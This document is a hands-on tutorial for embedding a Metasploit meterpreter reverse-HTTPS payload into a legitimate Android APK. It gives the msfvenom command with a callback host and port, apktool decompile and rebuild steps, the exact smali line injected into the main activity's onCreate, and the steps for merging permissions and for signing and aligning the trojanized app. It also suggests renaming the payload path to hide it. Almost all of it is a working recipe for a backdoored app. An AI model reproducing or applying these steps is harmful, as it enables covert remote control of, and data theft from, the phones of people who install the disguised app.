# Msfvenom Payload in APK (Manual Embedding)

### 1. Generating Payload using MSFVenom

```bash
msfvenom -p android/meterpreter_reverse_https LHOST=192.168.47.5 LPORT=443 -o Payload.apk
```



### 2. Decompiling Payload.apk

```bash
apktool d -f Payload.apk
```



### 3. Decompiling Original Apk

```bash
apktool d -f Original.apk
```



### 4. Embedding Payload to Original APK

First, Copy `Payload/smali/com/metasploit/stage/Payload.smali` to `Original/smali/com/metasploit/stage/Payload.smali`

Then, open `Original/AndroidManifest.xml` and find `<action android:name="android.intent.action.MAIN"/>`. Then look at its parent `<activity>` tag and take a note at the `<activity android:name="com.a.b.c.d">`. Now, goto `smali` folder and then follow the activity name to find the `d` file i.e `smali->com->a->b->c->d`.

In the file `d`, find the line `onCreate(Landroid/os/Bundle;)V` and under that line, you will see `invoke-super {p0, p1} ...`.

You have to enter the following line underneath this line : `invoke-static {p0}, Lcom/metasploit/stage/Payload;->onCreate(Landroid/content/Context;)V` or `invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V`

Please note that the above is a single line of code. It is possible to confuse by using a different pathname than “com/Metasploit/stage/Payload” however if you do that you will have to modify all references to the path in all of the “smali” files that are contained in the “Payload” directory and change the directory name itself. This can be done manually but is prone to error.

Finally, copy the NON-DUPLICATE PERMISSIONS from `Payload/AndroidManifest.xml` and paste them to `Original/AndroidManifest.xml`.



### 5. Recompiling the Modded APK

```bash
apktool b Original.apk
```

The unsigned modified apk will be present in `Original/dist` folder.



### 6. Signing the APK

First, (ONE TIME ONLY), you have to generate a keystore using `keytool` which contains the keys. Remember the **keystore password**, **alias** and **algorithm** as they will be used in next steps

```bash
keytool -genkey -V -keystore key.keystore -alias 1llus10n -keyalg RSA -keysize 2048 -validity 1000
```

Now, you will use `jarsigner` to sign the apk

```bash
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore Modded.apk 1llus10n
```



### 7. Optimizing the APK (ZipAlign)

```bash
zipalign -v 4 Modded-Signed.apk Modded-Signed-Optimized.apk
```

